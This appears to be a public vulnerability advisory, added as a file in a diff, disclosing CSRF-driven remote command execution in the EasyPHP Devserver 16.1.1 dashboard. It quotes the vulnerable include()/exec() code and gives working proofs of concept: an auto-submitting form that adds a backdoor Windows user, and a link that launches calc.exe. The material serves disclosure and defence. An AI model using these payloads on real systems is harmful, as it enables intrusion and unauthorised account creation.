@@ -1,0 +1,184 @@
+[+] Credits: John Page aka hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:
+http://hyp3rlinx.altervista.org/advisories/EASYPHP-DEV-SERVER-REMOTE-CMD-EXECUTION.txt
+
+[+] ISR: ApparitionSec
+
+
+
+Vendor:
+===============
+www.easyphp.org
+
+
+
+Product:
+=============================
+EasyPHP Devserver v16.1.1
+
+easyphp-devserver-16.1.1-setup.exe
+hash: 64184d330a34be9e6c029ffa63c903de
+
+
+A complete WAMP environment for PHP development & personal web hosting.
+Host with Webserver PHP, Apache, MySQL, Nginx, PhpMyAdmin,
+Xdebug, PostgreSQL, MongoDB, Python, Ruby...for Windows.
+
+
+Vulnerability Type:
+=================================
+CSRF / Remote Command Execution
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=====================
+
+EasyPHP Devserver dashboard runs on port 1111, the PHP code contains
+mulitple RCE vectors, which can allow
+arbitrary OS commands to be executed on the target system by remote
+attackers, if a user visits malicious webpage or link.
+
+The "index.php" and "explorer.php" files both contain vulnerable code that
+will happily process both GET / POST RCE requests.
+Below EasyPHP Code contains no CSRF token or checks whatsoever. All
+attacker needs is to supply 'type' and command values.
+
+Possibility for RFI (remote file inclusion) if the "allow_url_include=0"
+setting is changed in "php.ini" configuration.
+No checks or CSRF tokens for PHP include directives either, the default
+however is set to Off.
+
+e.g. RFI attempt result
+Warning: include(): http:// wrapper is disabled in the server configuration
+by allow_url_include=0
+
+
+line 8 of "explorer.php"
+======================
+
+//== ACTIONS
+==================================================================
+
+if (isset($_POST['action'])) {
+
+// Include and exec
+if (isset($_POST['action']['request'])) {
+foreach ($_POST['action']['request'] as $request) {
+if ($request['type'] == 'include') include(urldecode($request['value']));
+if ($request['type'] == 'exe') exec(urldecode($request['value']));
+}
+}
+$redirect = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+header("Location: " . $redirect);
+exit;
+}
+
+
+//////////////////////////////////////////////////
+
+line 48 "index.php"
+==================
+
+
+//== ACTIONS
+==================================================================
+
+if (isset($_POST['action'])) {
+
+// Include and exec
+if (isset($_POST['action']['request'])) {
+foreach ($_POST['action']['request'] as $request) {
+if ($request['type'] == 'include') include(urldecode($request['value']));
+if ($request['type'] == 'exe') exec(urldecode($request['value']));
+}
+}
+sleep(1);
+$redirect = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+header("Location: " . $redirect);
+exit;
+}
+
+if (isset($_GET['action'])) {
+// Include and exec
+if ($_GET['action'] == 'include') include(urldecode($_GET['value']));
+if ($_GET['action'] == 'exe') exec(urldecode($_GET['value']));
+if (isset($_GET['redirect'])) {
+$redirect = urldecode($_GET['redirect']);
+} else {
+$redirect = 'http://127.0.0.1:1111/index.php';
+}
+sleep(1);
+header("Location: " . $redirect);
+exit;
+}
+
+
+
+
+Exploit code(s):
+===============
+
+1) Add Backdoor User Account
+
+<form action="http://127.0.0.1:1111/explorer.php" method="post">
+<input type="hidden" name="action[request][0][type]" value="exe">
+<input type="hidden" name="action[request][0][value]" value="net user EVIL
+Password /add">
+<script>document.forms[0].submit()</script>
+</form>
+
+
+
+2) Run "calc.exe"
+
+<a href="http://127.0.0.1:1111/index.php?action=exe&value=calc.exe
+">Clicky...</a>
+
+
+
+
+Disclosure Timeline:
+======================================
+Vendor Notification: No replies
+November 22, 2016 : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+
+Severity Level:
+================
+Medium
+
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
